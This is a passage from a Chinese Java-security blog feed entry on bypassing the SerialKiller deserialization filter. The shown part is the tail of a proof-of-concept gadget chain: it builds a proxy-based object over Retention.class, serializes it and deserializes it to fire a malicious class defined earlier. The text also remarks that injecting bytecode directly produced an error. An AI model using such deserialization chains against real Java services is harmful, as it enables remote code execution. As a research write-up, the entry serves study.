class="line">        );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cons.newInstance(Retention.class, proxyMap);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(o);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>恶意类在上面写了</p><p>小问题：<br>这里直接把字节码写上去却不能执行<br>报错<br><img src="https://img-blog.csdnimg.cn/2ac5d1fd01d349499f1c91a2706a1451.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;省流&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#省流&quot;&gt;#&lt;/a&gt; 省流&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;SerialKiller&lt;/code&gt; &lt;br&gt;
 可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的&lt;br&gt;
类，其中限制了</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
